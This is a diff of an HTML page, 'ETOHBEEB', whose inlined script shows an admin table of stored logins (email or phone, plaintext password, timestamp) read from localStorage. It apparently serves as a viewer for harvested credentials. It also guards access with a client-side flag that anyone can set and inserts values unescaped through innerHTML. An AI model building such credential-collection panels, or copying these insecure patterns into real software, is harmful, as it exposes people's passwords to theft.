@@ -4,7 +4,90 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ETOHBEEB</title>
-    <link rel="stylesheet" href="css/etoh.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 90%;
+            max-width: 800px;
+            padding: 20px;
+            box-sizing: border-box;
+            background-color: #fff;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            overflow-x: auto;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 12px 15px;
+            text-align: left;
+            border: 1px solid #ddd;
+        }
+        th {
+            background-color: #f2f2f2;
+            font-weight: bold;
+        }
+        tr:nth-child(even) {
+            background-color: #f9f9f9;
+        }
+        tr:hover {
+            background-color: #f1f1f1;
+        }
+        .delete-btn {
+            background-color: #e74c3c;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .delete-btn:hover {
+            background-color: #c0392b;
+        }
+        @media(max-width: 768px) {
+            th, td {
+                display: block;
+                text-align: right;
+                padding-left: 50%;
+                position: relative;
+            }
+            th::before, td::before {
+                content: attr(data-label);
+                position: absolute;
+                left: 10px;
+                text-align: left;
+                font-weight: bold;
+            }
+            th {
+                background-color: transparent;
+                border-bottom: 2px solid #ddd;
+            }
+            td {
+                border: none;
+                border-bottom: 1px solid #ddd;
+            }
+            tr {
+                margin-bottom: 10px;
+                display: block;
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
@@ -23,6 +106,49 @@
             </tbody>
         </table>
     </div>
-    <script src="js/etoh.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if admin is logged in
+            if (localStorage.getItem('adminLoggedIn') !== 'true') {
+                window.location.href = 'etohbeeb.html'; // Redirect to login if not logged in
+                return;
+            }
+        
+            const allLoginDetails = JSON.parse(localStorage.getItem('allLoginDetails')) || [];
+            console.log('Retrieved login details:', allLoginDetails);
+        
+            const loginDetailsTable = document.getElementById('loginDetails');
+            if (allLoginDetails.length > 0) {
+                allLoginDetails.forEach((details, index) => {
+                    loginDetailsTable.innerHTML += `
+                        <tr data-index="${index}">
+                            <td data-label="Email or Phone">${details.emailOrPhone}</td>
+                            <td data-label="Password">${details.password}</td>
+                            <td data-label="Timestamp">${details.timestamp}</td>
+                            <td data-label="Actions"><button class="delete-btn" data-index="${index}">Delete</button></td>
+                        </tr>
+                    `;
+                });
+            } else {
+                loginDetailsTable.innerHTML = '<tr><td colspan="4">No login details found!</td></tr>';
+            }
+        
+            // Add event listeners to delete buttons
+            const deleteButtons = document.querySelectorAll('.delete-btn');
+            deleteButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    const index = this.getAttribute('data-index');
+                    deleteLoginDetail(index);
+                });
+            });
+        });
+        
+        function deleteLoginDetail(index) {
+            const allLoginDetails = JSON.parse(localStorage.getItem('allLoginDetails')) || [];
+            allLoginDetails.splice(index, 1); // Remove the item at the specified index
+            localStorage.setItem('allLoginDetails', JSON.stringify(allLoginDetails));
+            location.reload(); // Reload the page to update the table
+        }
+    </script>
 </body>
 </html>
